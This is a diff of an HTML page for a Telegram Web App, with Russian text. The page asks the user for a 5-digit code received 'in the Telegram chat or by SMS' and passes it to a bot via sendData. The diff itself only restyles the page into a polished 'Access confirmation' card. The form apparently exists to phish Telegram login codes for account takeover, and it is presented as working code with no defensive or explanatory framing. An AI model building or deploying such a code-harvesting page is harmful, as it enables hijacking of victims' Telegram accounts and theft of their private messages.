@@ -3,79 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Ввод кода</title>
+    <title>Подтверждение доступа</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
-            background-color: #1c1c1d;
-            color: white;
-            font-family: sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
-        .container { width: 90%; text-align: center; }
+        .card {
+            width: 85%;
+            background: #1c1c1e;
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        h2 { margin-top: 0; font-size: 22px; }
+        p { color: #8e8e93; font-size: 14px; line-height: 1.4; }
         input {
             width: 100%;
             padding: 15px;
-            border-radius: 10px;
-            border: none;
+            box-sizing: border-box;
+            border-radius: 12px;
+            border: 1px solid #3a3a3c;
             background: #2c2c2e;
-            color: white;
-            font-size: 20px;
+            color: #ffffff;
+            font-size: 24px;
             text-align: center;
-            margin-bottom: 20px;
+            margin: 20px 0;
+            letter-spacing: 5px;
             outline: none;
         }
+        input:focus { border-color: #007aff; }
         button {
             width: 100%;
             padding: 15px;
-            background: #248bed;
+            background: #007aff;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             color: white;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
         }
+        button:active { background: #0056b3; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Введите код</h2>
-        <p style="color: #8e8e93;">Код из чата Telegram или SMS</p>
-        <input type="number" id="code_input" placeholder="00000" inputmode="numeric">
-        <button id="send_btn">Подтвердить</button>
-    </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand(); // Развернуть на весь экран
+<div class="card">
+    <h2>Проверка кода</h2>
+    <p>Введите 5-значный код, который пришел вам в чат <b>Telegram</b> или по SMS.</p>
+    
+    <input type="number" id="tg_code" placeholder="•••••" inputmode="numeric" pattern="[0-9]*">
+    
+    <button id="submit_btn">ПОДТВЕРДИТЬ</button>
+</div>
 
-        const btn = document.getElementById('send_btn');
-        const input = document.getElementById('code_input');
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand(); // Разворачиваем окно на максимум
+    
+    // Настраиваем цвета темы под Telegram
+    tg.ready();
 
-        // Функция отправки
-        function sendToBot() {
-            const val = input.value.trim();
-            if (val.length >= 4) {
-                // ВАЖНО: sendData работает ТОЛЬКО если WebApp открыт через KeyboardButton
-                // или если бот ожидает данные после нажатия Inline-кнопки
-                tg.sendData(val); 
-                tg.close();
-            } else {
-                alert("Введите корректный код");
-            }
+    const inputField = document.getElementById('tg_code');
+    const submitBtn = document.getElementById('submit_btn');
+
+    // Функция отправки данных боту
+    function sendDataToBot() {
+        const codeValue = inputField.value.trim();
+        
+        if (codeValue.length >= 4) {
+            // МЕТОД SEND_DATA: отправляет текст боту и закрывает WebApp
+            tg.sendData(codeValue);
+        } else {
+            tg.showAlert("Пожалуйста, введите корректный код.");
         }
+    }
 
-        btn.addEventListener('click', sendToBot);
+    submitBtn.addEventListener('click', sendDataToBot);
 
-        // Также дублируем на кнопку в интерфейсе самого Telegram (нижняя панель)
-        tg.MainButton.setText("ОТПРАВИТЬ");
-        tg.MainButton.show();
-        tg.onEvent('mainButtonClicked', sendToBot);
-    </script>
+    // Дополнительно: кнопка "Готово" на мобильной клавиатуре
+    inputField.addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+            sendDataToBot();
+        }
+    });
+</script>
+
 </body>
 </html>
